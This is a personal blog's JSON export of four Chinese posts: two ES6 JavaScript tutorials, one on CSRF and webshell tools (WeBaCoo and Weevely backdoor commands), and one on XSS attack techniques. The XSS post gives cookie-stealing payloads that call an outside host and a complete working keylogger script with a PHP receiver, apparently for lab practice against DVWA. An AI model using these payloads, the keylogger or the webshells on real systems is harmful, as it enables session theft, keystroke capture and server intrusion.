{"meta":{"title":"Recall Hyx","subtitle":"Your star","description":null,"author":"Recall HYX","url":"https://recallhyx.github.io"},"pages":[{"title":"categories","date":"2018-02-07T12:43:56.000Z","updated":"2018-02-07T12:47:29.537Z","comments":false,"path":"categories/index.html","permalink":"https://recallhyx.github.io/categories/index.html","excerpt":"","text":""},{"title":"tags","date":"2018-02-07T12:45:00.000Z","updated":"2018-02-07T12:47:28.043Z","comments":false,"path":"tags/index.html","permalink":"https://recallhyx.github.io/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"JavaScript ES6一些有用的语法特性(函数的扩展、数组的扩展)","slug":"ES6（2）","date":"2018-02-07T02:20:54.000Z","updated":"2018-02-07T13:43:45.823Z","comments":true,"path":"2018/02/07/ES6（2）/","link":"","permalink":"https://recallhyx.github.io/2018/02/07/ES6（2）/","excerpt":"","text":"函数的扩展—默认值 和 rest 参数默认值ES6 允许为函数的参数设置默认值，即直接写在参数定义的后面。1234567function log(x, y = 'World') &#123; console.log(x, y);&#125;log('Hello') // Hello Worldlog('Hello', 'China') // Hello Chinalog('Hello', '') // Hello 参数变量是默认声明的，所以不能用let或const再次声明。1234function foo(x = 5) &#123; let x = 1; // error const x = 2; // error&#125; 上面代码中，参数变量x是默认声明的，在函数体中，不能用let或const再次声明，否则会报错。 使用参数默认值时，函数不能有同名参数。12345678910// 不报错function foo(x, x, y) &#123; // ...&#125;// 报错function foo(x, x, y = 1) &#123; // ...&#125;// SyntaxError: Duplicate parameter name not allowed in this context 另外，一个容易忽略的地方是，参数默认值不是传值的，而是每次都重新计算默认值表达式的值。也就是说，参数默认值是惰性求值的。123456789let x = 99;function foo(p = x + 1) &#123; console.log(p);&#125;foo() // 100x = 100;foo() // 101 上面代码中，参数p的默认值是x + 1。这时，每次调用函数foo，都会重新计算x + 1，而不是默认p等于 100。利用参数默认值，可以指定某一个参数不得省略，如果省略就抛出一个错误。12345678910function throwIfMissing() &#123; throw new Error('Missing parameter');&#125;function foo(mustBeProvided = throwIfMissing()) &#123; return mustBeProvided;&#125;foo()// Error: Missing parameter 上面代码的foo函数，如果调用的时候没有参数，就会调用默认值throwIfMissing函数，从而抛出一个错误。 从上面代码还可以看到，参数mustBeProvided的默认值等于throwIfMissing函数的运行结果（注意函数名throwIfMissing之后有一对圆括号），这表明参数的默认值不是在定义时执行，而是在运行时执行。如果参数已经赋值，默认值中的函数就不会运行。 另外，可以将参数默认值设为undefined，表明这个参数是可以省略的。1function foo(optional = undefined) &#123; ··· &#125; rest参数ES6 引入 rest 参数（形式为…变量名），用于获取函数的多余参数，这样就不需要使用arguments对象了。rest 参数搭配的变量是一个数组，该变量将多余的参数放入数组中。1234567891011function add(...values) &#123; let sum = 0; for (var val of values) &#123; sum += val; &#125; return sum;&#125;add(2, 5, 3) // 10 上面代码的add函数是一个求和函数，利用 rest 参数，可以向该函数传入任意数目的参数。 下面是一个 rest 参数代替arguments变量的例子。1234567// arguments变量的写法function sortNumbers() &#123; return Array.prototype.slice.call(arguments).sort();&#125;// rest参数的写法const sortNumbers = (...numbers) =&gt; numbers.sort(); 上面代码的两种写法，比较后可以发现，rest 参数的写法更自然也更简洁。 arguments对象不是数组，而是一个类似数组的对象。所以为了使用数组的方法，必须使用Array.prototype.slice.call先将其转为数组。rest 参数就不存在这个问题，它就是一个真正的数组，数组特有的方法都可以使用。下面是一个利用 rest 参数改写数组push方法的例子。123456789function push(array, ...items) &#123; items.forEach(function(item) &#123; array.push(item); console.log(item); &#125;);&#125;var a = [];push(a, 1, 2, 3) 注意，rest 参数之后不能再有其他参数（即只能是最后一个参数），否则会报错。1234// 报错function f(a, ...b, c) &#123; // ...&#125; 函数的length属性，不包括 rest 参数。123(function(a) &#123;&#125;).length // 1(function(...a) &#123;&#125;).length // 0(function(a, ...b) &#123;&#125;).length // 1 数组的扩展—扩展运算符、Array.from()、Array.of() 和 数组实例的 entries()，keys() ，values() 和 includes()扩展运算符扩展运算符（spread）是三个点（…）。它好比 rest 参数的逆运算，将一个数组转为用逗号分隔的参数序列。1234567891011121314151617181920console.log(...[1, 2, 3])// 1 2 3console.log(1, ...[2, 3, 4], 5)// 1 2 3 4 5[...document.querySelectorAll('div')]// [&lt;div&gt;, &lt;div&gt;, &lt;div&gt;]该运算符主要用于函数调用。function push(array, ...items) &#123; array.push(...items);&#125;function add(x, y) &#123; return x + y;&#125;const numbers = [4, 38];add(...numbers) // 42 上面代码中，array.push(...items)和add(...numbers)这两行，都是函数的调用，它们的都使用了扩展运算符。该运算符将一个数组，变为参数序列。 扩展运算符与正常的函数参数可以结合使用，非常灵活。123function f(v, w, x, y, z) &#123; &#125;const args = [0, 1];f(-1, ...args, 2, ...[3]); 扩展运算符后面还可以放置表达式。1234const arr = [ ...(x &gt; 0 ? ['a'] : []), 'b',]; 如果扩展运算符后面是一个空数组，则不产生任何效果。12[...[], 1]// [1] Array.from()Array.from方法用于将两类对象转为真正的数组：类似数组的对象（array-like object）和可遍历（iterable）的对象（包括 ES6 新增的数据结构 Set 和 Map）。 下面是一个类似数组的对象，Array.from将它转为真正的数组。123456789101112let arrayLike = &#123; '0': 'a', '1': 'b', '2': 'c', length: 3&#125;;// ES5的写法var arr1 = [].slice.call(arrayLike); // ['a', 'b', 'c']// ES6的写法let arr2 = Array.from(arrayLike); // ['a', 'b', 'c'] 实际应用中，常见的类似数组的对象是 DOM 操作返回的 NodeList集合，以及函数内部的arguments对象。Array.from都可以将它们转为真正的数组。1234567891011// NodeList对象let ps = document.querySelectorAll('p');Array.from(ps).filter(p =&gt; &#123; return p.textContent.length &gt; 100;&#125;);// arguments对象function foo() &#123; var args = Array.from(arguments); // ...&#125; 上面代码中，querySelectorAll方法返回的是一个类似数组的对象，可以将这个对象转为真正的数组，再使用forEach方法。 只要是部署了 Iterator 接口的数据结构，Array.from都能将其转为数组。12345Array.from('hello')// ['h', 'e', 'l', 'l', 'o']let namesSet = new Set(['a', 'b'])Array.from(namesSet) // ['a', 'b'] 上面代码中，字符串和 Set 结构都具有 Iterator 接口，因此可以被Array.from转为真正的数组。 如果参数是一个真正的数组，Array.from会返回一个一模一样的新数组。12Array.from([1, 2, 3])// [1, 2, 3] 值得提醒的是，扩展运算符（...）也可以将某些数据结构转为数组。1234567// arguments对象function foo() &#123; const args = [...arguments];&#125;// NodeList对象[...document.querySelectorAll('div')] 扩展运算符背后调用的是遍历器接口（Symbol.iterator），如果一个对象没有部署这个接口，就无法转换。Array.from方法还支持类似数组的对象。所谓类似数组的对象，本质特征只有一点，即必须有length属性。因此，任何有length属性的对象，都可以通过Array.from方法转为数组，而此时扩展运算符就无法转换。12Array.from(&#123; length: 3 &#125;);// [ undefined, undefined, undefined ] 上面代码中，Array.from返回了一个具有三个成员的数组，每个位置的值都是undefined。扩展运算符转换不了这个对象。 对于还没有部署该方法的浏览器，可以用Array.prototype.slice方法替代。123const toArray = (() =&gt; Array.from ? Array.from : obj =&gt; [].slice.call(obj))(); Array.from还可以接受第二个参数，作用类似于数组的map方法，用来对每个元素进行处理，将处理后的值放入返回的数组。123456Array.from(arrayLike, x =&gt; x * x);// 等同于Array.from(arrayLike).map(x =&gt; x * x);Array.from([1, 2, 3], (x) =&gt; x * x)// [1, 4, 9] 下面的例子是取出一组 DOM 节点的文本内容。1234567let spans = document.querySelectorAll('span.name');// map()let names1 = Array.prototype.map.call(spans, s =&gt; s.textContent);// Array.from()let names2 = Array.from(spans, s =&gt; s.textContent) 下面的例子将数组中布尔值为false的成员转为0。12Array.from([1, , 2, , 3], (n) =&gt; n || 0)// [1, 0, 2, 0, 3] 另一个例子是返回各种数据的类型。12345function typesOf () &#123; return Array.from(arguments, value =&gt; typeof value)&#125;typesOf(null, [], NaN)// ['object', 'object', 'number'] 如果map函数里面用到了this关键字，还可以传入Array.from的第三个参数，用来绑定this。 Array.from()可以将各种值转为真正的数组，并且还提供map功能。这实际上意味着，只要有一个原始的数据结构，你就可以先对它的值进行处理，然后转成规范的数组结构，进而就可以使用数量众多的数组方法。12Array.from(&#123; length: 2 &#125;, () =&gt; 'jack')// ['jack', 'jack'] 上面代码中，Array.from的第一个参数指定了第二个参数运行的次数。这种特性可以让该方法的用法变得非常灵活。 Array.from()的另一个应用是，将字符串转为数组，然后返回字符串的长度。因为它能正确处理各种 Unicode 字符，可以避免 JavaScript 将大于\\uFFFF的 Unicode 字符，算作两个字符的 bug。123function countSymbols(string) &#123; return Array.from(string).length;&#125; Array.of()Array.of方法用于将一组值，转换为数组。123Array.of(3, 11, 8) // [3,11,8]Array.of(3) // [3]Array.of(3).length // 1 这个方法的主要目的，是弥补数组构造函数Array()的不足。因为参数个数的不同，会导致Array()的行为有差异。123Array() // []Array(3) // [, , ,]Array(3, 11, 8) // [3, 11, 8] 上面代码中，Array方法没有参数、一个参数、三个参数时，返回结果都不一样。只有当参数个数不少于 2 个时，Array()才会返回由参数组成的新数组。参数个数只有一个时，实际上是指定数组的长度。 Array.of基本上可以用来替代Array()或new Array()，并且不存在由于参数不同而导致的重载。它的行为非常统一。1234Array.of() // []Array.of(undefined) // [undefined]Array.of(1) // [1]Array.of(1, 2) // [1, 2] Array.of总是返回参数值组成的数组。如果没有参数，就返回一个空数组。 Array.of方法可以用下面的代码模拟实现。123function ArrayOf()&#123; return [].slice.call(arguments);&#125; 数组实例的 entries()，keys() ，values()ES6 提供三个新的方法——entries()，keys()和values()——用于遍历数组。它们都返回一个遍历器对象，可以用for...of循环进行遍历，唯一的区别是keys()是对键名的遍历、values()是对键值的遍历，entries()是对键值对的遍历。1234567891011121314151617for (let index of ['a', 'b'].keys()) &#123; console.log(index);&#125;// 0// 1for (let elem of ['a', 'b'].values()) &#123; console.log(elem);&#125;// 'a'// 'b'for (let [index, elem] of ['a', 'b'].entries()) &#123; console.log(index, elem);&#125;// 0 \"a\"// 1 \"b\" 如果不使用for...of循环，可以手动调用遍历器对象的next方法，进行遍历。12345let letter = ['a', 'b', 'c'];let entries = letter.entries();console.log(entries.next().value); // [0, 'a']console.log(entries.next().value); // [1, 'b']console.log(entries.next().value); // [2, 'c'] 数组实例的 includes()Array.prototype.includes方法返回一个布尔值，表示某个数组是否包含给定的值，与字符串的includes方法类似。ES2016 引入了该方法。123[1, 2, 3].includes(2) // true[1, 2, 3].includes(4) // false[1, 2, NaN].includes(NaN) // true 该方法的第二个参数表示搜索的起始位置，默认为0。如果第二个参数为负数，则表示倒数的位置，如果这时它大于数组长度（比如第二个参数为-4，但数组长度为3），则会重置为从0开始。12[1, 2, 3].includes(3, 3); // false[1, 2, 3].includes(3, -1); // true 没有该方法之前，我们通常使用数组的indexOf方法，检查是否包含某个值。123if (arr.indexOf(el) !== -1) &#123; // ...&#125; indexOf方法有两个缺点，一是不够语义化，它的含义是找到参数值的第一个出现位置，所以要去比较是否不等于-1，表达起来不够直观。二是，它内部使用严格相等运算符（===）进行判断，这会导致对NaN的误判。12[NaN].indexOf(NaN)// -1 includes使用的是不一样的判断算法，就没有这个问题。12[NaN].includes(NaN)// true 下面代码用来检查当前环境是否支持该方法，如果不支持，部署一个简易的替代版本。123456const contains = (() =&gt; Array.prototype.includes ? (arr, value) =&gt; arr.includes(value) : (arr, value) =&gt; arr.some(el =&gt; el === value))();contains(['foo', 'bar'], 'baz'); // =&gt; false 另外，Map 和 Set 数据结构有一个has方法，需要注意与includes区分。 Map 结构的has方法，是用来查找键名的，比如Map.prototype.has(key)、WeakMap.prototype.has(key)、Reflect.has(target, propertyKey)。Set结构的has方法，是用来查找值的，比如Set.prototype.has(value)、WeakSet.prototype.has(value)。 参考：阮一峰《ECMAScript 6 入门》","categories":[{"name":"前端","slug":"前端","permalink":"https://recallhyx.github.io/categories/前端/"}],"tags":[{"name":"javascript","slug":"javascript","permalink":"https://recallhyx.github.io/tags/javascript/"}]},{"title":"JavaScript ES6介绍及一些有用的语法特性(let 和 const，变量的解构赋值)","slug":"ES6（1）","date":"2018-02-06T05:04:54.000Z","updated":"2018-02-07T13:44:05.871Z","comments":true,"path":"2018/02/06/ES6（1）/","link":"","permalink":"https://recallhyx.github.io/2018/02/06/ES6（1）/","excerpt":"","text":"ES6简介 ECMAScript 6.0（简称 ES6）是 JavaScript 语言的下一代标准，已经在 2015 年 6 月正式发布了。它的目标，是使得 JavaScript 语言可以用来编写复杂的大型应用程序，成为企业级开发语言。 ES6是下一代 JavaScript 的标准，也就是说，现在的浏览器用的 JavaScript 脚本大部分是以前的版本，就会有很多怪异的难以理解的行为，而ES6就是为了让 JavaScript 更好的理解而制定的标准 ES6和ECMAScript 2015的关系 ECMAScript 2015（简称 ES2015）这个词，也是经常可以看到的。它与 ES6 是什么关系呢？2011 年，ECMAScript 5.1 版发布后，就开始制定 6.0 版了。因此，ES6 这个词的原意，就是指 JavaScript 语言的下一个版本。但是，因为这个版本引入的语法功能太多，而且制定过程当中，还有很多组织和个人不断提交新功能。事情很快就变得清楚了，不可能在一个版本里面包括所有将要引入的功能。常规的做法是先发布 6.0 版，过一段时间再发 6.1 版，然后是 6.2 版、6.3 版等等。但是，标准的制定者不想这样做。他们想让标准的升级成为常规流程：任何人在任何时候，都可以向标准委员会提交新语法的提案，然后标准委员会每个月开一次会，评估这些提案是否可以接受，需要哪些改进。如果经过多次会议以后，一个提案足够成熟了，就可以正式进入标准了。这就是说，标准的版本升级成为了一个不断滚动的流程，每个月都会有变动。标准委员会最终决定，标准在每年的 6 月份正式发布一次，作为当年的正式版本。接下来的时间，就在这个版本的基础上做改动，直到下一年的 6 月份，草案就自然变成了新一年的版本。这样一来，就不需要以前的版本号了，只要用年份标记就可以了。ES6 的第一个版本，就这样在 2015 年 6 月发布了，正式名称就是《ECMAScript 2015 标准》（简称 ES2015）。2016 年 6 月，小幅修订的《ECMAScript 2016 标准》（简称 ES2016）如期发布，这个版本可以看作是 ES6.1 版，因为两者的差异非常小（只新增了数组实例的includes方法和指数运算符），基本上是同一个标准。根据计划，2017 年 6 月发布 ES2017 标准。因此，ES6 既是一个历史名词，也是一个泛指，含义是 5.1 版以后的 JavaScript 的下一代标准，涵盖了 ES2015、ES2016、ES2017 等等，而 ES2015 则是正式名称，特指该年发布的正式版本的语言标准。本书中提到 ES6 的地方，一般是指 ES2015 标准，但有时也是泛指“下一代 JavaScript 语言”。 部署进度各大浏览器的最新版本，对 ES6 的支持可以查看kangax.github.io/es5-compat-table/es6/。随着时间的推移，支持度已经越来越高了，超过 90%的 ES6 语法特性都实现了。这里，推荐我一直在用的 TypeScript ，它是微软开发的编程语言，是 JavaScript 的超集，使用 TypeScript编写，可以使用 ES6的特性，在编码的时候就会编译出一个对应的 js 文件，里面就是标准的 js代码。一个TypeScript应用可以利用已存在的JavaScript脚本。编译后的TypeScript脚本也可以在JavaScript中使用。 ES6一些有用的语法特性let 和 constJavaScript变量声明命令 var 很让人头疼，通过 var 定义的变量，它的作用域是在 function 或任何外部已经被声明的 function，是全域的 。最常见的就是在循环后还能引用到值1234567var a = [];for (var i = 0; i &lt; 10; i++) &#123; a[i] = function () &#123; console.log(i); &#125;;&#125;a[6](); // 10 上述代码中a[6]()的值就是循环后i的值，因为i是var命令声明的，在全局范围内有效，所以全局只有一个变量i。每一次循环，i的值都会改变，而循环内被赋给数组a的函数内部的console.log(i)，里面的i指向的就是全局的i，也就是说，所有数组a的成员里面的i，指向的都是同一个i，导致运行时输出的最后一轮的i的值，就是10var还有一种情况就是 变量提升什么是变量提升？简单来说就是变量可以在声明之前使用，值为undefined，相当于变量定义的语句被移动到作用域的最顶部注意：函数声明和变量定义存在变量提升，但函数表达式没有变量提升123456/*变量提升*/foo = 2;var foo;// 被隐式地解释为:var foo;foo = 2; 1234567891011catName(\"Chloe\");function catName(name) &#123; console.log(\"My cat's name is \" + name);&#125;// \"My cat's name is Chloe\"// 等价于/*函数声明提升*/function catName(name) &#123; console.log(\"My cat's name is \" + name);&#125;catName(\"Tigger\"); 在代码中使用一个函数或变量，在声明该函数或变量之前，这种行为很怪，这个时候，let的出现，解决了作用域和变量提升的问题。ES6 新增了let命令，用来声明变量。它的用法类似于var，但是所声明的变量，只在let命令所在的代码块内有效。上述循环用let则不会出现问题1234567var a = [];for (let i = 0; i &lt; 10; i++) &#123; a[i] = function () &#123; console.log(i); &#125;;&#125;a[6](); // 6 变量提升的问题也得到解决1234567// var 的情况console.log(foo); // 输出undefinedvar foo = 2;// let 的情况console.log(bar); // 报错ReferenceErrorlet bar = 2; let实际上为 JavaScript 新增了块级作用域，有了块级作用域，就不会出现循环变量泄漏为全局变量1234for(var i=0;i&lt;3;i++)&#123; //&#125;console.log(i);//3 另外一个命令是const，声明一个只读的常量，一旦声明，常量的值就不能改变，这就意味着，const一旦声明变量，就必须立即初始化，不能留到以后再赋值12const a;//Uncaught SyntaxError: Missing initializer in const declaration const实际上保证的，并不是变量的值不得改动，而是变量指向的那个内存地址不得改动。对于简单类型的数据（数值、字符串、布尔值），值就保存在变量指向的那个内存地址，因此等同于常量。但对于复合类型的数据（主要是对象和数组），变量指向的内存地址，保存的只是一个指针，const只能保证这个指针是固定的，至于它指向的数据结构是不是可变的，就完全不能控制了。因此，将一个对象声明为常量必须非常小心。123456const person=&#123;&#125;;person.age=18;person.age;//18person = &#123;&#125;;//Uncaught TypeError: Assignment to constant variable. 上面代码中，常量person储存的是一个地址，这个地址指向一个对象。不可变的只是这个地址，即不能把person指向另一个地址，但对象本身是可变的，所以依然可以为其添加新属性。const和let的作用域相同，只在声明所在的块级作用域内有效，除此之外，ES6 还规定了暂时性死区（temporal dead zone，简称 TDZ）。如果区块中存在let和const命令，这个区块对这些命令声明的变量，从一开始就形成了封闭作用域。凡是在声明之前就使用这些变量，就会报错。1234567891011if (true) &#123; // TDZ开始 tmp = 'abc'; // ReferenceError console.log(tmp); // ReferenceError let tmp; // TDZ结束 console.log(tmp); // undefined tmp = 123; console.log(tmp); // 123&#125; “暂时性死区”也意味着typeof不再是一个百分之百安全的操作。123typeof x;let x;//Uncaught ReferenceError: x is not defined 作为比较，如果一个变量根本没有被声明，使用typeof反而不会报错。12typeof y;\"undefined\" 所以，在没有let之前，typeof运算符是百分之百安全的，永远不会报错。现在这一点不成立了。这样的设计是为了让大家养成良好的编程习惯，变量一定要在声明之后使用，否则就报错。 变量的解构赋值ES6 允许按照一定模式，从数组和对象中提取值，对变量进行赋值，这被称为解构（Destructuring）。let [a, b, c] = [1, 2, 3]上面代码表示，可以从数组中提取值，按照对应位置，对变量赋值。本质上，这种写法属于“模式匹配”，只要等号两边的模式相同，左边的变量就会被赋予对应的值。下面是一些使用嵌套数组进行解构的例子。1234567891011121314151617181920let [foo, [[bar], baz]] = [1, [[2], 3]];foo // 1bar // 2baz // 3let [ , , third] = [\"foo\", \"bar\", \"baz\"];third // \"baz\"let [x, , y] = [1, 2, 3];x // 1y // 3let [head, ...tail] = [1, 2, 3, 4];head // 1tail // [2, 3, 4]let [x, y, ...z] = ['a'];x // \"a\"y // undefinedz // [] 如果解构不成功，变量的值就等于undefined。12let [foo] = [];let [bar, foo] = [1]; 以上两种情况都属于解构不成功，foo的值都会等于undefined。 另一种情况是不完全解构，即等号左边的模式，只匹配一部分的等号右边的数组。这种情况下，解构依然可以成功。12345678let [x, y] = [1, 2, 3];x // 1y // 2let [a, [b], d] = [1, [2, 3], 4];a // 1b // 2d // 4 上面两个例子，都属于不完全解构，但是可以成功。 如果等号的右边不是数组（或者严格地说，不是可遍历的结构），那么将会报错。1234567// 报错let [foo] = 1;let [foo] = false;let [foo] = NaN;let [foo] = undefined;let [foo] = null;let [foo] = &#123;&#125;; 上面的语句都会报错，因为等号右边的值，要么转为对象以后不具备 Iterator 接口（前五个表达式），要么本身就不具备 Iterator 接口（最后一个表达式）。变量的解构赋值用途很多。（1）交换变量的值1234let x = 1;let y = 2;[x, y] = [y, x]; 上面代码交换变量x和y的值，这样的写法不仅简洁，而且易读，语义非常清晰。 （2）从函数返回多个值 函数只能返回一个值，如果要返回多个值，只能将它们放在数组或对象里返回。有了解构赋值，取出这些值就非常方便。12345678910111213141516// 返回一个数组function example() &#123; return [1, 2, 3];&#125;let [a, b, c] = example();// 返回一个对象function example() &#123; return &#123; foo: 1, bar: 2 &#125;;&#125;let &#123; foo, bar &#125; = example(); （3）函数参数的定义 解构赋值可以方便地将一组参数与变量名对应起来。1234567// 参数是一组有次序的值function f([x, y, z]) &#123; ... &#125;f([1, 2, 3]);// 参数是一组无次序的值function f(&#123;x, y, z&#125;) &#123; ... &#125;f(&#123;z: 3, y: 2, x: 1&#125;); （4）提取 JSON 数据 解构赋值对提取 JSON 对象中的数据，尤其有用。12345678910let jsonData = &#123; id: 42, status: \"OK\", data: [867, 5309]&#125;;let &#123; id, status, data: number &#125; = jsonData;console.log(id, status, number);// 42, \"OK\", [867, 5309] 上面代码可以快速提取 JSON 数据的值。 （5）函数参数的默认值1234567891011jQuery.ajax = function (url, &#123; async = true, beforeSend = function () &#123;&#125;, cache = true, complete = function () &#123;&#125;, crossDomain = false, global = true, // ... more config&#125;) &#123; // ... do stuff&#125;; 指定参数的默认值，就避免了在函数体内部再写var foo = config.foo || ‘default foo’;这样的语句。 （6）遍历 Map 结构 任何部署了 Iterator 接口的对象，都可以用for…of循环遍历。Map 结构原生支持 Iterator 接口，配合变量的解构赋值，获取键名和键值就非常方便。1234567891011121314151617181920const map = new Map();map.set('first', 'hello');map.set('second', 'world');for (let [key, value] of map) &#123; console.log(key + \" is \" + value);&#125;// first is hello// second is world如果只想获取键名，或者只想获取键值，可以写成下面这样。// 获取键名for (let [key] of map) &#123; // ...&#125;// 获取键值for (let [,value] of map) &#123; // ...&#125; （7）输入模块的指定方法 加载模块时，往往需要指定输入哪些方法。解构赋值使得输入语句非常清晰。1const &#123; SourceMapConsumer, SourceNode &#125; = require(\"source-map\"); 参考：阮一峰《ECMAScript 6 入门》","categories":[{"name":"前端","slug":"前端","permalink":"https://recallhyx.github.io/categories/前端/"}],"tags":[{"name":"javascript","slug":"javascript","permalink":"https://recallhyx.github.io/tags/javascript/"}]},{"title":"CSRF和WebShell","slug":"CSRF和WebShell","date":"2018-02-05T08:08:24.000Z","updated":"2018-02-05T08:08:51.141Z","comments":true,"path":"2018/02/05/CSRF和WebShell/","link":"","permalink":"https://recallhyx.github.io/2018/02/05/CSRF和WebShell/","excerpt":"","text":"CSRF（Cross-site request forgery）与xss经常混淆，可以从信任的角度来区分XSS：利用用户对站点的信任CSRF：利用站点对已经身份认证的信任结合社会工程学在身份认证会话过程中实现攻击 修改帐号密码、个人信息（电话、收货地址） 发送伪造的业务请求（网银、购物、投票） 关注他人社交帐号、推送博文 在用户非自愿、不知情的情况下提交请求 漏洞利用条件： 被害用户已经完成身份认证 新请求的提交不需要重新身份认证或确认机制 攻击者必须了解WEB APP请求的参数构造 诱使用户出发攻击的指令（社会工程学） 利用Burpsuite的CSRF Poc Generator可以生成代码 点击之后就会自动生成html代码自动扫描程序的检测方法 在请求和相应过程中检查是否存在anti-CSRF token名 检查服务器是否验证anti-CSRF token的名值 检查token中可编辑的字符串 检查referrer 头是否可以伪造 对策 Captcha anti-CSRF token Referrer头 降低会话超时时间 WEBSHELL介绍webshell就是一些放置在服务器的脚本文件通过参数来执行操作系统的一些指令一些WEBSHELL工具介绍： 中国菜刀据说官网是：http://www.maicaidao.co/ 注意：不确定这个版本是否有木马，网上有很多版本安插了自己的木马，如果执行的话就中病毒了，所以请保证在虚拟机执行，之后恢复操作方式：将菜刀文件下的服务器代码注入到服务器，然后执行客户端程序，就能连上目标服务器 WeBaCoo（Web Backdoor Cookie）类终端的shell，编码通信内容通过cookie头传输，隐蔽性较强，只支持phpcm：base64编码的命令cn：服务器用于返回数据的cookie头的名cp：返回信息定界符 Weevely隐蔽的类终端php webshell30多个管理模块 执行系统命令，浏览文件系统 检查服务器常见配置错误 创建正向，反向TCP shell 连接 通过目标 计算机代理HTTP流量 从目标计算机运行端口扫描，渗透内网 支持连接密码 由于中国菜刀网上不确定的版本太多，就不介绍了，主要介绍WeBaCoo、Weevely WeBaCoo生成服务端webacoo -g -o a.php然后把生成的a.php注入到目标服务器最后生成客户端程序webacoo -t -u http://1.1.1.1/a.php连接目标服务器更多参数的使用可以webacoo -h查看 Weevely生成服务端weevely generate &lt;password&gt; b.php其中的是自己设置的连接密码，以后客户端都要使用连接密码，生成的b.php文件在/var/share/weevely目录下然后把b.php注入到目标服务器最后连接weevely http://1.1.1.1/b.php &lt;password&gt;连接目标服务器在连接完目标服务器的shell下输入命令help可以查看Weevely的模块 关于怎么注入文件，之前的博文已经有介绍了，可以去看看学习一下","categories":[{"name":"安全","slug":"安全","permalink":"https://recallhyx.github.io/categories/安全/"}],"tags":[{"name":"漏洞","slug":"漏洞","permalink":"https://recallhyx.github.io/tags/漏洞/"}]},{"title":"XSS常用攻击手段","slug":"XSS常用攻击手段","date":"2018-01-31T06:48:21.000Z","updated":"2018-01-31T06:52:52.360Z","comments":true,"path":"2018/01/31/XSS常用攻击手段/","link":"","permalink":"https://recallhyx.github.io/2018/01/31/XSS常用攻击手段/","excerpt":"","text":"XSS（cross-site scripting） 通过WEB站点漏洞，向客户端交付恶意脚本代码，实现对客户端的攻击目的注入客户端脚本代码，盗取cookie、重定向 使用场景12345直接嵌入html：&lt;script&gt; alert('xss);&lt;/script&gt;元素标签时间：&lt;body onload=alert('xss')&gt;图片标签：&lt;img src=\"javascript:alert('xss);\"&gt;其他标签：&lt;iframe&gt;，&lt;div&gt;，&lt;link&gt;DOM对象，篡改页面内容 漏洞形成的根源： 服务器对用户提交数据过滤不严 提交给服务器的脚本被直接返回给其他客户端执行 脚本在客户端执行恶意操作 XSS漏洞类型： 存储型（持久型） 反射型（非持久） DOM 型 怎么知道网站是否有漏洞：提交的数据原封不动的返回 提交表单后 反射型漏洞注入：1234567891011&lt;script&gt;alert('xss');&lt;/script&gt;&lt;a href='' onlick=alert('xss');&gt;&lt;/a&gt;&lt;img src=http://192.168.1.1/a.jpg onerror=alert('xss');&lt;/script&gt;（当图片找不到就会执行onerror）&lt;script&gt;window.location='http://192.168.1.1'&lt;/script&gt;（页面重定向）&lt;iframe src=\"http://192.168.1.1/victim\" height=\"0\" width=\"0\"&gt;&lt;/iframe&gt;&lt;script&gt;new Image().src=\"http://1.1.1.1/c.php?output=\"+document.cookie;&lt;/iframe&gt;（将cookie发送到自己的主机）&lt;script&gt;document.body.innerHTML=\"&lt;div style=visibility:visible;&gt;&lt;h1&gt;HELLO&lt;/h1&gt;&lt;/div&gt;;\"&lt;/script&gt;&lt;script src=\"http://1.1.1.1/a.js\"&gt;&lt;/script&gt;a.js: var img = new Image();img.src=\"http://1.1.1.1/cookie.php?cookie=\"+document.cookie（让浏览器去包含一个有木马的js文件，这样有隐蔽性） 反射型漏洞例子：键盘记录器原理：在被攻击者的电脑浏览器上调用指定ip地址上的js文件，即利用XSS输入以下脚本&lt;script src=&quot;http://1.1.1.1/keylogger.js&quot;&gt;&lt;/script&gt; 在/var/www/html/目录下新建keylogger.js keylogger.js1234567891011document.onkeypress = function(evt) &#123; evt = evt || window.event; key = String.fromCharCode(evt.charCode) if(key) &#123; var http = new XMLHttpRequest(); var param = encodeURI(key); http.open(\"POST\",\"http://1.1.1.1/keylogger.php\",true);//注意：把ip地址改成自己的ip http.setRequestHeader(\"Content-type\",\"application/x-www-form-urlencoded\"); http.send(\"key=\"+param); &#125; &#125; 由于我们是由keylogger.php文件接收键盘记录的，所以还需要一个php脚本 keylogger.php1234567&lt;?php $key = $_POST['key']; $logfile = \"keylog.txt\"; $fp = fopen($logfile,\"a\"); fwrite($fp,$key); fclose($fp);?&gt; 然后新建一个keylog.txt，用来记录被攻击者的键盘记录，改写它的权限chmod 777 keylog.txt然后执行service apache2 start开启apache，可以用netstat -pantu | grep :80查看被占用的进程然后杀掉确保能够访问到刚才写的js脚本 最后就可以在有XSS漏洞的地方输入&lt;script src=&quot;http://1.1.1.1/keylogger.js&quot;&gt;&lt;/script&gt;注入脚本 提交之后，可以看到url地址已经变了，而且被攻击者也有提示输入成功，这个时候我们就可以敲键盘，没有焦点也可以记录键盘，这里为了显示方便，我们在输入框输入hello hacker Xsser–自动化工具 图形化/命令行界面（图形化只需要在命令行输入xsser --gtk） 绕过服务器端输入筛选10进制/16进制unescape() xsser -u “http://172.16.242.128/dvwa/vulnerabilities/“ -g “xss_r/?name=” –cookie=”security=low; PHPSESSID=1f7c245b5c6145fbeb0f36d5e601ef2f” -s -v –reverse-check 参数12345-g（Get方法） -p （Post方法）-s （在结束后显示统计信息）-v （显示详细信息）--reverse-check （发送一个含有本机连接的js文件，基于连接是否被建立来判断时候有漏洞）--heuristic （检查被过滤的字符） 对payload编码，绕过服务器端筛选过滤12345678910--Str Use method String.FromCharCode()--Une Use Unescape() function--Mix Mix String.FromCharCode() and Unescape()--Dec Use Decimal encoding--Hex Use Hexadecimal encoding--Hes Use Hexadecimal encoding with semicolons--Dwo Encode IP addresses with DWORD--Doo Encode IP addresses with Octal--Cem=CEM Set different 'Character Encoding Mutations' (reversing obfuscators) (ex: 'Mix,Une,Str,Hex') 注入技术1234567--Coo COO - Cross Site Scripting Cookie injection--Xsa XSA - Cross Site Agent Scripting--Xsr XSR - Cross Site Referer Scripting--Dcp DCP - Data Control Protocol injections--Dom DOM - Document Object Model injections--Ind IND - HTTP Response Splitting Induced code--Anchor ANC - Use Anchor Stealth payloader (DOM shadows!) 其他可以用的参数1234567--Fp=FINALPAYLOAD OWN - Exploit your own code--Fr=FINALREMOTE REMOTE - Exploit a script -remotely---Doss DOSs - XSS (server) Denial of Service--Dos DOS - XSS (client) Denial of Service--B64 B64 - Base64 code encoding in META tag (rfc2397)--Onm ONM - Use onMouseMove() event--Ifr IFR - Use &lt;iframe&gt; source tag 存储型XSS 